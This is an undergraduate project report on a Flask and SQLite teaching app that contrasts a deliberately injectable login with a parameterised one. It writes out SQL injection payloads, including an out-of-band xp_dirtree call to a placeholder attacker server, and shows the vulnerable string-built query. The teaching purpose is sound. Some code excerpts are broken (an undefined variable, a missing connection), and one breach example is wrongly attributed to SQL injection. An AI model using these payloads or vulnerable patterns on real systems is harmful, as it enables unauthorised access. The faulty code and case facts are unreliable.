# PROJECT REPORT

## SQL Injection Attack Detection and Prevention Using Secure Login System

---

**Submitted by:**

**Mohd Yasin Kazi**

TYBSc Computer Science

SIWS College

**Under the guidance of:**

[Guide Name]

[Academic Year]

---

## Certificate

This is to certify that **Mohd Yasin Kazi** of TYBSc Computer Science, SIWS College, has successfully completed the project titled **"SQL Injection Attack Detection and Prevention Using Secure Login System"** under my guidance during the academic year [Year].

The project is the result of the student's own work and is being submitted in partial fulfillment of the requirements for the Bachelor of Science in Computer Science degree.

**Date:** _______

**Guide Signature:** ___________________

**Head of Department:** ___________________

**External Examiner:** ___________________

---

## Acknowledgement

I would like to express my sincere gratitude to all those who provided me with the opportunity and support to complete this project.

First and foremost, I would like to thank my project guide, **[Guide Name]**, for their invaluable guidance, encouragement, and constructive feedback throughout the development of this project.

I am grateful to the **Head of Department, Computer Science**, for providing the necessary facilities and resources.

I also thank the **faculty members of SIWS College** for their support and encouragement.

Finally, I would like to thank my **family and friends** for their unwavering support and understanding during the course of this project.

**Mohd Yasin Kazi**  
TYBSc Computer Science  
SIWS College

---

## Abstract

SQL Injection remains one of the most critical and prevalent security vulnerabilities in web applications. According to the OWASP Top 10 Web Application Security Risks, injection attacks have consistently ranked among the most dangerous threats to web application security. This project presents a comprehensive educational demonstration of SQL Injection attacks and their prevention through the implementation of two distinct login systems.

The project implements a web application using Python Flask framework with a SQLite database backend. The first login system is deliberately vulnerable, constructing SQL queries through string concatenation — a practice that leaves applications susceptible to SQL Injection attacks. The second login system employs parameterized queries (prepared statements), which represent the industry-standard defense against SQL Injection.

Users can interact with both systems to understand how SQL Injection works in practice. The vulnerable system allows users to inject SQL payloads such as `' OR '1'='1` to bypass authentication, while the secure system demonstrates how parameterized queries render such attacks ineffective. The actual SQL queries executed are displayed in real-time, providing transparent insight into the underlying mechanisms.

The project serves as an educational tool for computer science students, helping them understand both the attack vectors and the defensive techniques essential for developing secure web applications. It emphasizes the importance of secure coding practices, input validation, and the principle of defense in depth.

**Keywords:** SQL Injection, Parameterized Queries, Web Security, Flask, SQLite, Prepared Statements, Cyber Security Education

---

## Table of Contents

1. [About Project](#6-about-project)
2. [Objectives](#7-objectives)
3. [Introduction](#8-introduction)
   - 3.1 Cyber Security
   - 3.2 Database
   - 3.3 SQL
   - 3.4 SQL Injection
   - 3.5 Types of SQL Injection
   - 3.6 Real World Examples
   - 3.7 Risks
   - 3.8 Prevention
4. [Existing System](#9-existing-system)
5. [Proposed System](#10-proposed-system)
6. [System Architecture](#11-system-architecture)
7. [Flowchart](#12-flowchart)
8. [Data Flow Diagram](#13-data-flow-diagram)
9. [Working](#14-working)
10. [Technologies Used](#15-technologies-used)
11. [Implementation](#16-implementation)
12. [Screenshots](#17-screenshots)
13. [Advantages](#18-advantages)
14. [Limitations](#19-limitations)
15. [Future Scope](#20-future-scope)
16. [Conclusion](#21-conclusion)
17. [Bibliography](#22-bibliography)

---

## 6. About Project

The project "SQL Injection Attack Detection and Prevention Using Secure Login System" is an educational web application developed to demonstrate the mechanics of SQL Injection attacks and the corresponding defensive techniques.

The application provides two parallel login interfaces:

1. **Insecure Login System:** This system deliberately uses vulnerable SQL query construction methods (string concatenation) to allow users to experience how SQL Injection attacks can bypass authentication. A prominent warning banner clearly labels this system as vulnerable and educational.

2. **Secure Login System:** This system implements industry-standard protection using parameterized queries. It demonstrates how the same SQL Injection payloads that work on the vulnerable system are rendered completely ineffective.

The project targets computer science students who are learning web development and security concepts. By providing hands-on experience with both vulnerable and secure systems, students develop a practical understanding of why secure coding practices are essential.

The application features a modern dark-themed user interface with responsive design, session management, flash messages, and interactive elements such as one-click SQL payload copying. It is built using Python Flask for the backend, SQLite for the database, and standard web technologies (HTML, CSS, JavaScript) for the frontend.

---

## 7. Objectives

The primary objectives of this project are:

1. **Educational Demonstration:** To provide students with a practical, hands-on understanding of SQL Injection vulnerabilities and their impact on web application security.

2. **Attack Simulation:** To demonstrate how SQL Injection attacks work by implementing a deliberately vulnerable login system that users can interact with safely.

3. **Prevention Showcase:** To show how parameterized queries (prepared statements) effectively prevent SQL Injection, using the same attack payloads on a secure login system for comparison.

4. **Real-Time Visualization:** To display the actual SQL queries generated by both systems, helping students understand the underlying mechanics of both vulnerable and secure code.

5. **Security Awareness:** To raise awareness about the importance of secure coding practices, input validation, and defense-in-depth strategies in web development.

6. **Practical Learning:** To provide a complete, runnable codebase that students can explore, modify, and learn from as part of their computer science curriculum.

---

## 8. Introduction

### 8.1 Cyber Security

Cyber Security is the practice of protecting systems, networks, programs, and data from digital attacks, damage, or unauthorized access. It encompasses a wide range of technologies, processes, and practices designed to safeguard the confidentiality, integrity, and availability of information — commonly known as the **CIA Triad**.

- **Confidentiality:** Ensuring that information is accessible only to those authorized to access it.
- **Integrity:** Safeguarding the accuracy and completeness of information and processing methods.
- **Availability:** Ensuring that authorized users have access to information and associated assets when required.

Web application security is a critical subset of cyber security, as web applications are often the primary interface between organizations and their users. Web vulnerabilities, including SQL Injection, Cross-Site Scripting (XSS), and Cross-Site Request Forgery (CSRF), represent significant threats to modern digital systems.

### 8.2 Database

A database is an organized collection of structured information, or data, typically stored electronically in a computer system. A **Database Management System (DBMS)** is the software that interacts with end users, applications, and the database itself to capture and analyze data.

**Relational Database Management Systems (RDBMS)** organize data into tables with rows and columns. Each table represents an entity (e.g., users, products, orders), and relationships between tables are defined through foreign keys. Popular RDBMS include MySQL, PostgreSQL, Oracle, Microsoft SQL Server, and SQLite.

SQLite, used in this project, is a lightweight, file-based relational database engine. It requires no server setup, making it ideal for development, testing, and educational purposes. Despite its simplicity, SQLite supports standard SQL syntax and is ACID-compliant.

### 8.3 SQL

**Structured Query Language (SQL)** is the standard programming language for managing and manipulating relational databases. SQL allows users to perform various operations on data, including:

- **SELECT:** Retrieve data from one or more tables
- **INSERT:** Add new records to a table
- **UPDATE:** Modify existing records
- **DELETE:** Remove records from a table
- **CREATE/DROP:** Create or delete database objects (tables, indexes, views)

SQL queries are written as text statements that the database engine parses and executes. A typical SELECT query follows this structure:

```sql
SELECT column1, column2 FROM table_name WHERE condition ORDER BY column;
```

The WHERE clause is particularly relevant to SQL Injection, as it is the most common injection point. It filters rows based on specified conditions using comparison operators (=, <, >, LIKE, etc.) and logical operators (AND, OR, NOT).

### 8.4 SQL Injection

**SQL Injection** is a code injection technique where an attacker inserts malicious SQL statements into an application's input fields. It exploits vulnerabilities in the way applications construct SQL queries, specifically when user input is directly concatenated into query strings without proper sanitization or parameterization.

**How SQL Injection Works:**

Consider a vulnerable login query constructed as:

```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

If a user enters a valid username and password (e.g., admin/admin123), the query works as intended:

```sql
SELECT * FROM users WHERE username='admin' AND password='admin123'
```

However, if an attacker enters `admin' --` as the username and anything as the password, the query becomes:

```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```

The `--` is SQL's single-line comment syntax. Everything after it becomes a comment, so the password check is completely bypassed. The database interprets this as:

```sql
SELECT * FROM users WHERE username='admin'
```

This returns the admin user's record, and the application logs the attacker in as admin.

Another common injection uses always-true conditions:

```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
```

Since `'1'='1'` is always true, the WHERE clause evaluates to true for every row, returning all users in the database.

### 8.5 Types of SQL Injection

SQL Injection attacks can be categorized into three main types:

#### 8.5.1 In-band SQL Injection (Classic)

This is the most common type, where the attacker uses the same communication channel to both inject the malicious SQL and receive the results.

**Error-based SQL Injection:** The attacker uses error messages from the database to gather information about the database structure. For example:

```sql
' AND 1=CAST((SELECT @@version) AS int) --
```

If the database version cannot be converted to integer, an error message reveals the version string.

**Union-based SQL Injection:** The attacker uses the UNION SQL operator to combine the results of the original query with results from other tables:

```sql
' UNION SELECT username, password FROM users --
```

This returns the original query results combined with usernames and passwords from the users table.

#### 8.5.2 Blind SQL Injection (Inferential)

Blind SQL Injection occurs when the application does not display database errors or query results directly. The attacker must infer information from the application's behavior.

**Boolean-based Blind SQL Injection:** The attacker sends payloads that evaluate to true or false and observes the application's response. If the response differs, the attacker can infer information:

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a' --
```

If the page loads normally, the first character of the admin's password is 'a'.

**Time-based Blind SQL Injection:** The attacker uses database functions that cause delays to infer information when the response content does not vary:

```sql
' OR IF(1=1, SLEEP(5), 0) --
```

If the response takes 5 seconds, the condition is true.

#### 8.5.3 Out-of-band SQL Injection

This less common type uses alternative channels (DNS lookups, HTTP requests) to exfiltrate data. It is used when the attacker cannot receive results through the same channel or when the application is too restrictive.

```sql
' EXEC xp_dirtree '\\attacker-server\share\data' --
```

This technique is database-specific and requires certain features to be enabled.

### 8.6 Real World Examples

#### Heartland Payment Systems (2008)
One of the largest data breaches in history, affecting 130 million credit card numbers. The attacker used SQL Injection to install malware on Heartland's payment processing network. The breach resulted in over $200 million in losses and highlighted the devastating consequences of SQL Injection vulnerabilities in critical financial infrastructure.

#### Sony Pictures (2011)
Attackers used SQL Injection to compromise Sony's PlayStation Network and other systems, resulting in the theft of personal information from 77 million user accounts. The breach cost Sony an estimated $171 million and severely damaged customer trust.

#### TalkTalk (2015)
A SQL Injection attack on British telecommunications company TalkTalk led to the theft of personal data from 157,000 customers. The attack exploited a vulnerable web page that used string concatenation in SQL queries. The company faced a record £400,000 fine from the UK Information Commissioner's Office.

#### British Airways (2018)
Attackers injected malicious code into British Airways' website and mobile app through a compromised third-party script. While not purely SQL Injection, the attack demonstrated how input validation failures can lead to massive data breaches — 380,000 payment card records were stolen.

#### Marriott International (2018)
A SQL Injection vulnerability allowed attackers to access the reservation database of Marriott's Starwood properties, compromising 500 million guest records including passport numbers and payment card information.

These examples demonstrate that SQL Injection is not a theoretical threat — it has caused billions of dollars in damages and affected hundreds of millions of users worldwide.

### 8.7 Risks

The risks associated with SQL Injection vulnerabilities include:

1. **Authentication Bypass:** Attackers can log in as any user without knowing their password, gaining unauthorized access to the application.

2. **Data Breach:** Sensitive data including passwords, financial information, personal details, and intellectual property can be stolen.

3. **Data Loss:** Attackers can DELETE or DROP tables, permanently destroying data.

4. **Data Corruption:** Attackers can modify existing data, compromising integrity.

5. **Privilege Escalation:** Attackers can gain administrative access to the database server.

6. **Complete System Compromise:** In severe cases, SQL Injection can lead to remote code execution on the database server, giving attackers control over the entire system.

7. **Reputational Damage:** Data breaches erode customer trust and damage brand reputation.

8. **Financial Loss:** Including regulatory fines, legal costs, remediation expenses, and lost business.

9. **Legal Liability:** Organizations may face lawsuits and regulatory penalties for failing to protect user data.

### 8.8 Prevention

The following techniques prevent SQL Injection:

#### 8.8.1 Parameterized Queries (Prepared Statements)
The most effective defense. The SQL statement template is defined with placeholders, and user input is passed separately. The database driver handles escaping and ensures input is treated as data.

**Secure Example:**
```python
cursor.execute(
    "SELECT * FROM users WHERE username=? AND password=?",
    (username, password)
)
```

#### 8.8.2 Input Validation
Validate all user input against expected patterns:
- **Whitelist validation:** Accept only known-good characters/patterns
- **Type validation:** Ensure numeric fields contain numbers
- **Length validation:** Reject excessively long inputs
- **Format validation:** Use regex patterns for expected formats

#### 8.8.3 Stored Procedures
Pre-compiled SQL code stored in the database. When implemented correctly with parameters (not concatenation), stored procedures prevent injection.

#### 8.8.4 Least Privilege Principle
Database accounts should have only the minimum permissions required. Application accounts should not have DROP, CREATE, or administrative privileges.

#### 8.8.5 Web Application Firewall (WAF)
A WAF can detect and block SQL injection attempts before they reach the application, providing an additional layer of defense.

#### 8.8.6 Regular Security Testing
- Vulnerability scanning
- Penetration testing
- Code reviews
- Automated security testing in CI/CD pipelines

---

## 9. Existing System

Traditional web applications often implement login systems using insecure coding practices, particularly in legacy systems or applications developed without adequate security awareness. Common characteristics of existing vulnerable systems include:

1. **String Concatenation in SQL Queries:** Many older applications and tutorials demonstrate login functionality using direct string concatenation, which is inherently vulnerable.

2. **Lack of Input Validation:** Some systems fail to validate user input before processing it, allowing malicious payloads to reach the database.

3. **Verbose Error Messages:** Applications that display detailed database error messages aid attackers in crafting more effective injections.

4. **Excessive Database Privileges:** Many applications connect to the database with administrative privileges, allowing attackers to perform destructive operations if injection succeeds.

5. **No Prepared Statement Usage:** Many existing tutorials and beginner-level code examples use concatenation rather than parameterized queries.

6. **Limited Security Awareness:** Educational resources often focus on functionality over security, teaching students to build working applications without adequate security considerations.

The existing approach to SQL Injection education typically involves:
- Theoretical explanations in textbooks
- Isolated code snippets showing vulnerable code
- Limited hands-on practice opportunities
- No side-by-side comparison of vulnerable vs secure implementations

This project addresses these gaps by providing an interactive, side-by-side demonstration that students can experiment with directly in their browsers.

---

## 10. Proposed System

The proposed system addresses the shortcomings of existing educational approaches by providing:

1. **Dual Login Systems:** Two complete login implementations (insecure and secure) running on the same platform, allowing direct comparison.

2. **Interactive SQL Injection Demonstration:** Users can enter actual injection payloads and see the results in real-time, including the generated SQL query.

3. **Real-Time Query Visualization:** The actual SQL query constructed by the application is displayed after each login attempt, providing transparency into the underlying mechanism.

4. **Pre-built Payload Library:** One-click copy functionality for common SQL injection payloads makes the demonstration accessible to beginners.

5. **Comprehensive Educational Content:** Detailed explanations of why each system is vulnerable or secure are embedded within the application pages.

6. **Session Management:** Proper session handling to demonstrate that security must be maintained throughout the entire application lifecycle.

7. **Professional Interface:** A modern, responsive dark-theme UI that enhances the learning experience.

8. **Complete Documentation:** Full project report, presentation outline, viva questions, and references support comprehensive learning.

The system architecture follows the Model-View-Controller (MVC) pattern:
- **Model:** SQLite database with users table
- **View:** HTML templates rendered with Jinja2
- **Controller:** Flask routes handling HTTP requests

---

## 11. System Architecture

The system follows a three-tier architecture:

```
+-------------------+          +-------------------+          +-------------------+
|                   |          |                   |          |                   |
|   Presentation    |  HTTP    |   Application     |  SQL     |   Data            |
|   Layer           | <-----> |   Layer           | <-----> |   Layer           |
|                   |          |                   |          |                   |
|   HTML Templates  |          |   Flask Routes    |          |   SQLite          |
|   CSS Styles      |          |   Session Mgmt    |          |   Database        |
|   JavaScript      |          |   Query Builder   |          |   users Table     |
|                   |          |   Flash Messages  |          |                   |
+-------------------+          +-------------------+          +-------------------+
```

### Component Description:

**1. Presentation Layer (Frontend)**
- HTML templates rendered server-side using Jinja2
- CSS for styling (dark theme, responsive design, animations)
- JavaScript for client-side validation and interactivity

**2. Application Layer (Backend)**
- Flask web server handling HTTP requests
- Route handlers for each page and action
- Session management using Flask's built-in sessions
- Flash message system for user notifications
- Two distinct query construction methods (insecure concatenation vs secure parameterization)

**3. Data Layer (Database)**
- SQLite database (single file - database.db)
- Single table 'users' with columns: id, username, password, created_at
- Six pre-loaded demo users for testing

### Request Flow:

1. User navigates to a page in their browser
2. Browser sends HTTP GET/POST request to Flask server
3. Flask routes the request to the appropriate handler function
4. Handler processes input (query database, validate, etc.)
5. Response is rendered as HTML and sent back to the browser

For login specifically:
1. User submits login form with username and password
2. Flask receives POST request at /insecure or /secure
3. For insecure: query built via string concatenation
4. For secure: query executed via parameterized statement
5. If user found, session is created and user is redirected to dashboard
6. If not found or error, flash message is displayed

---

## 12. Flowchart

### Insecure Login Flowchart

```
        START
          |
          v
    Display Login Page
          |
          v
    User enters credentials
          |
          v
    Build SQL query via
    string concatenation
          |
          v
     /------------------\
    | Execute SQL query   |
     \------------------/
          |
          v
    User found? ---No---> Display "Invalid Credentials"
          |                        |
         Yes                       v
          |                  Back to Login Page
          v
    Create Session
          |
          v
    Redirect to Dashboard
          |
          v
        END
```

### Secure Login Flowchart

```
        START
          |
          v
    Display Login Page
          |
          v
    User enters credentials
          |
          v
    Execute parameterized
    query (placeholder ?)
          |
          v
     /------------------\
    | Execute SQL query   |
     \------------------/
          |
          v
    User found? ---No---> Display "Invalid Credentials"
          |                        |
         Yes                       v
          |                  Back to Login Page
          v
    Create Session
          |
          v
    Redirect to Dashboard
          |
          v
        END
```

### Key Difference

The critical difference between the two flows is in the **Query Construction** step:

- **Insecure:** `f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"` — User input is directly interpolated into the SQL string.
- **Secure:** `execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))` — User input is passed as parameters, separate from the SQL structure.

---

## 13. Data Flow Diagram

### Level 0 DFD (Context Diagram)

```
                    +-----------------------+
                    |                       |
    +-------------> |   SQL Injection       | <-------------+
    |               |   Demo System         |               |
    |               |                       |               |
    |               +-----------------------+               |
    |                     |           ^                     |
    |                     |           |                     |
    |                     v           |                     |
    |             +---------------+   |                     |
    |             |    SQLite     |   |                     |
    |             |   Database    |   |                     |
    |             +---------------+   |                     |
    |                                                       |
    +-------------------------------------------------------+
                    ^                           ^
                    |                           |
                    v                           v
            +-----------+             +---------------+
            |   User    |             |  Application  |
            | (Browser) |             |   (Flask)     |
            +-----------+             +---------------+
```

### Level 1 DFD

```
                        +---------------------+
                        |                     |
                        |    1.0 Display      |
     User Request ----->|     Login Page      |-----> HTML Page
                        |                     |
                        +---------------------+
                                |
                                v
                        +---------------------+
                        |                     |
                        |    2.0 Process      |
     Login Credentials->|     Login Form      |
                        |                     |
                        +---------------------+
                           /             \
                          /               \
                         v                 v
              +------------------+  +------------------+
              | 3.0 Insecure     |  | 4.0 Secure       |
              | Query Builder    |  | Query Builder    |
              | (Concatenation)  |  | (Parameterized)  |
              +------------------+  +------------------+
                      |                      |
                      v                      v
              +------------------+  +------------------+
              | 5.0 Database     |  | 5.0 Database     |
              | Query Execution  |  | Query Execution  |
              +------------------+  +------------------+
                      |                      |
                      v                      v
              +------------------+  +------------------+
              | 6.0 Session     |  | 6.0 Session     |
              | Creation        |  | Creation        |
              +------------------+  +------------------+
                      |                      |
                      +----------+-----------+
                                 |
                                 v
                        +------------------+
                        | 7.0 Dashboard    |
                        | Display          |
                        +------------------+
```

---

## 14. Working

### Step-by-Step Walkthrough

#### Step 1: Launch the Application

The user runs `python app.py` which starts the Flask development server on `http://127.0.0.1:5000`. If the database file does not exist, the application automatically initializes it by calling `init_db()` from `database.py`.

#### Step 2: Landing Page

The user navigates to the root URL and sees the landing page (`index.html`). This page provides:
- An overview of the project
- Navigation links to both login systems
- Cards describing each system (insecure and secure)
- A list of demo users for testing

#### Step 3: Attempt Insecure Login

The user navigates to the insecure login page at `/insecure`. This page displays:
- A RED warning banner: "FOR EDUCATIONAL PURPOSE ONLY"
- A login form with username and password fields
- An "INSECURE" badge indicating vulnerability
- A list of SQL injection payloads to try

**Scenario A: Normal Login**
- User enters valid credentials (e.g., admin / admin123)
- The server constructs: `SELECT * FROM users WHERE username='admin' AND password='admin123'`
- The query executes normally and returns the admin user
- The server creates a session and redirects to the dashboard
- The dashboard shows: "You logged in through the INSECURE method"

**Scenario B: SQL Injection Attack**
- User enters `' OR '1'='1` as both username and password
- The server constructs: `SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'`
- The WHERE clause is always true because `'1'='1'` evaluates to true
- The query returns ALL users from the database
- Python's `fetchone()` returns the first user (admin)
- The server creates a session for the admin user
- The user is logged in as admin without knowing the password!
- The dashboard displays the SQL query that was executed

#### Step 4: Attempt Secure Login

The user navigates to the secure login page at `/secure`. This page displays:
- A GREEN banner: "SECURE LOGIN - Protected against SQL Injection"
- An identical login form
- A "SECURE" badge
- An explanation of parameterized queries

**User tries the same SQL Injection payload:**
- User enters `' OR '1'='1` as username
- The server executes: `cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))`
- The database driver treats the entire input `' OR '1'='1` as a literal string value for the username
- It searches for a user whose username is literally the string `' OR '1'='1`
- No such user exists, so the query returns no results
- The server displays: "Invalid credentials"
- The injection attempt FAILS

#### Step 5: Dashboard

After successful login (via either method), the user is redirected to the dashboard. The dashboard:
- Displays the logged-in user's username
- Shows which login method was used (insecure/secure)
- Provides educational content about SQL Injection
- Offers navigation to try the other login method or logout

#### Step 6: Logout

Clicking logout clears the session and redirects the user to the landing page with a "Logged out successfully" message. The session is destroyed, and accessing `/dashboard` requires re-authentication.

---

## 15. Technologies Used

### 15.1 HTML5

**HyperText Markup Language 5** is the standard markup language for creating web pages and web applications. HTML5 is the fifth and latest major version of HTML.

**Role in this project:** HTML5 provides the structure for all web pages. Key features used include:
- Semantic tags (`<nav>`, `<footer>`, `<section>`) for better document structure
- `<form>` elements with input fields for login functionality
- `<table>` elements for displaying demo users and project information
- Responsive meta tag for mobile compatibility
- Data attributes and custom attributes for JavaScript interaction

**Key Features of HTML5 used:**
- `<!DOCTYPE html>` declaration
- Semantic elements for accessibility and SEO
- Form input types (text, password, submit)
- Template inheritance with Jinja2
- Character encoding with UTF-8

### 15.2 CSS3

**Cascading Style Sheets 3** is the style sheet language used for describing the presentation of HTML documents. CSS3 is the latest evolution of CSS.

**Role in this project:** CSS3 provides the visual design and layout for the application. Key features used include:
- **CSS Custom Properties** (variables) for consistent theming with a dark color palette
- **Flexbox** for one-dimensional layouts (navigation, cards, footer)
- **CSS Grid** for two-dimensional layouts (cards grid, comparison grid)
- **Media Queries** for responsive design at multiple breakpoints
- **Animations** (@keyframes) for fade-in effects and warning pulse
- **Transitions** for hover effects and smooth state changes
- **Gradients** for background effects and text styling
- **Pseudo-classes** (:hover, :focus, :active, :nth-child)
- **Pseudo-elements** (::before, ::after) for decorative content
- **Custom scrollbar styling** with ::-webkit-scrollbar

**Design Choices:**
- Dark navy background (#0a0e1a) reduces eye strain
- Blue accent colors (#2563eb, #3b82f6) create a professional look
- Glassmorphism effects with semi-transparent cards
- Red accents for danger/warning elements
- Green accents for security/success indicators

### 15.3 JavaScript (Vanilla)

**JavaScript** is a high-level, interpreted programming language that enables dynamic behavior in web pages. Vanilla JavaScript refers to using pure JavaScript without any libraries or frameworks.

**Role in this project:** JavaScript adds interactivity and enhances the user experience. Key features used include:
- **DOM Manipulation:** Selecting and modifying page elements
- **Event Handling:** Click events, form submission, focus events
- **Clipboard API:** Copying SQL injection payloads to clipboard
- **Animation:** Fade-out effects for flash messages
- **Form Validation:** Client-side validation before form submission
- **Timers:** setTimeout and setInterval for timed actions

**Key Functions:**
- `copyPayload()` — Copies SQL injection payload to clipboard
- `autoDismissFlashMessages()` — Automatically hides notifications
- `setupFormValidation()` — Validates form inputs client-side
- `fadeOut()` — Animates element removal

### 15.4 Python

**Python** is a high-level, general-purpose programming language known for its readability, simplicity, and extensive standard library. It is one of the most popular programming languages for web development, data science, and automation.

**Role in this project:** Python serves as the backend programming language. It handles:
- HTTP request processing through Flask
- Database operations through the sqlite3 module
- Session management
- Business logic and routing
- Template rendering

**Key Python Features Used:**
- **Functions:** Modular code organization
- **Decorators:** @app.route() for URL routing, @wraps for session protection
- **Exception Handling:** try/except blocks for error management
- **Context Managers:** Automatic resource cleanup
- **List Comprehensions:** Efficient data processing
- **Standard Library:** sqlite3, os, functools modules

### 15.5 Flask

**Flask** is a lightweight WSGI web application framework for Python. It is designed to be simple and extensible, making it ideal for small to medium-sized web applications and educational projects.

**Role in this project:** Flask provides the web server framework. Key components used include:

**Routes:**
```python
@app.route('/insecure', methods=['GET', 'POST'])
def insecure_login():
    # Handle insecure login
```

**Templates:**
```python
return render_template('dashboard.html', username=user, login_type='secure')
```

**Sessions:**
```python
session['user_id'] = user['id']
session['username'] = user['username']
```

**Flash Messages:**
```python
flash('Login successful!', 'success')
```

**Key Flask Features Used:**
- **URL Routing:** Mapping URLs to Python functions
- **Template Rendering:** Jinja2 template engine integration
- **Session Management:** Signed cookie-based sessions
- **Flash Messaging:** One-time notification messages
- **Request Handling:** POST form data processing
- **Static File Serving:** CSS and JS file delivery

### 15.6 SQLite

**SQLite** is a C-language library that implements a small, fast, self-contained, high-reliability, full-featured SQL database engine. It is the most widely deployed database engine in the world.

**Role in this project:** SQLite provides the database storage. Key characteristics used include:

**No Server Required:** SQLite reads and writes directly to a single file (database.db), unlike client-server databases that require separate database server processes.

**Python Integration:** The sqlite3 module is part of Python's standard library, requiring no additional installation:
```python
import sqlite3
conn = sqlite3.connect('database.db')
```

**ACID Compliance:** SQLite ensures Atomic, Consistent, Isolated, and Durable transactions.

**Database Schema:**
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

### 15.7 SQL

**Structured Query Language** is used for managing data in the database. Two distinct SQL approaches are demonstrated:

**Insecure (String Concatenation):**
```sql
SELECT * FROM users WHERE username='admin' AND password='admin123'
```

**After Injection:**
```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
```

**Secure (Parameterized):**
```python
cursor.execute(
    "SELECT * FROM users WHERE username=? AND password=?",
    (username, password)
)
```

The question mark `?` is a placeholder. The database driver handles proper escaping and ensures the input is treated as data, not SQL code.

---

## 16. Implementation

### 16.1 File: `database.py`

#### Function: `get_db()`
**Purpose:** Creates and returns a connection to the SQLite database.
```python
def get_db():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn
```
- `sqlite3.connect()` opens a connection to the database file
- `row_factory = sqlite3.Row` allows accessing columns by name (e.g., `user['username']`) instead of index

#### Function: `init_db()`
**Purpose:** Initializes the database with the users table and demo data.
```python
def init_db():
    if os.path.exists(DATABASE):
        os.remove(DATABASE)
    conn = get_db()
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE,
            password TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    demo_users = [
        ('admin', 'admin123'),
        ('user1', 'pass123'),
        ('user2', 'test456'),
        ('demo', 'demo123'),
        ('student', 'project2024'),
        ('test', 'test123')
    ]
    
    cursor.executemany(
        'INSERT INTO users (username, password) VALUES (?, ?)',
        demo_users
    )
    conn.commit()
    conn.close()
```
- Removes existing database to ensure clean state
- Creates the `users` table with auto-incrementing ID
- Note: Even database initialization uses parameterized queries (`?`) — secure coding even for setup
- Uses `executemany()` for efficient bulk insertion

### 16.2 File: `init_db.py`

**Purpose:** Entry point for manual database initialization.
```python
from database import init_db

if __name__ == '__main__':
    init_db()
```
- Simply imports and calls `init_db()`
- Can be run independently: `python init_db.py`

### 16.3 File: `app.py`

#### Configuration
```python
app = Flask(__name__)
app.secret_key = 'sql-injection-demo-secret-key-2024'
```
- Creates Flask application instance
- `secret_key` is required for session management (signs session cookies)
- In production, this should be a secure random value

#### Decorator: `login_required`
```python
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            flash('Please login first', 'warning')
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function
```
- Custom decorator that checks for a valid session
- If no user is logged in, redirects to index with a flash message
- Prevents unauthorized access to the dashboard

#### Route: `index()`
```python
@app.route('/')
def index():
    return render_template('index.html')
```
- Renders the landing page
- No authentication required

#### Route: `insecure_login()` — THE VULNERABLE ROUTE
```python
@app.route('/insecure', methods=['GET', 'POST'])
def insecure_login():
    if request.method == 'POST':
        username = request.form['username'].strip()
        password = request.form['password'].strip()
        
        if not username or not password:
            flash('Please fill all fields', 'error')
            return render_template('login.html')
        
        conn = get_db()
        cursor = conn.cursor()
        
        try:
            # VULNERABLE: String concatenation in SQL query
            query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
            cursor.execute(query)
            user = cursor.fetchone()
            
            if user:
                session['user_id'] = user['id']
                session['username'] = user['username']
                session['login_type'] = 'insecure'
                flash('Login successful! (INSECURE)', 'warning')
                return redirect(url_for('dashboard'))
        except Exception as e:
            flash(f'SQL Error: {str(e)}', 'error')
        finally:
            conn.close()
    
    return render_template('login.html', query_tried=query_tried)
```
**Key Security Issue:** The line `query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"` directly interpolates user input into the SQL string. This is the vulnerability being demonstrated.

#### Route: `secure_login()` — THE SECURE ROUTE
```python
@app.route('/secure', methods=['GET', 'POST'])
def secure_login():
    if request.method == 'POST':
        username = request.form['username'].strip()
        password = request.form['password'].strip()
        
        cursor = conn.cursor()
        
        # SECURE: Parameterized query
        cursor.execute(
            "SELECT * FROM users WHERE username=? AND password=?",
            (username, password)
        )
        user = cursor.fetchone()
```
**Key Security Feature:** The query uses `?` placeholders. User input is passed as a separate tuple parameter. The database driver automatically escapes special characters and ensures input is treated as data.

#### Route: `dashboard()`
```python
@app.route('/dashboard')
@login_required
def dashboard():
    return render_template(
        'dashboard.html',
        username=session.get('username'),
        login_type=session.get('login_type')
    )
```
- Protected by `@login_required` decorator
- Passes session data to the template
- Displays user-specific content based on login type

#### Route: `logout()`
```python
@app.route('/logout')
def logout():
    session.clear()
    flash('Logged out successfully', 'info')
    return redirect(url_for('index'))
```
- Clears all session data
- Displays logout confirmation
- Redirects to landing page

### 16.4 Template: `index.html`

The landing page features:
- Warning banner at the top
- Navigation bar with links to all pages
- Hero section with project title and description
- Two clickable cards (Insecure and Secure) that link to respective login pages
- "What is SQL Injection?" section with explanation
- "Project Features" section with bullet-point list
- "Demo Users" table showing all valid credentials
- Footer with developer credit and disclaimer
- Flash message container for notifications

**Template Inheritance Note:** This project uses individual templates rather than a base template for simplicity. All templates share common structure (warning banner, nav, footer, flash messages) defined independently in each file.

### 16.5 Template: `login.html` (Insecure)

The insecure login page features:
- RED warning banner with pulse animation
- "INSECURE" vulnerability badge
- Login form with username and password fields
- SQL Query display area (shows the executed query after each attempt)
- SQL Injection payload helper section with one-click copy
- Pre-built payloads: `admin' --`, `' OR '1'='1`, `admin' /*`, `admin' OR '1'='1' --`
- Code explanation section showing the vulnerable query construction
- "Why is this login vulnerable?" educational section
- Connection to secure login page

### 16.6 Template: `secure_login.html` (Secure)

The secure login page features:
- GREEN security banner
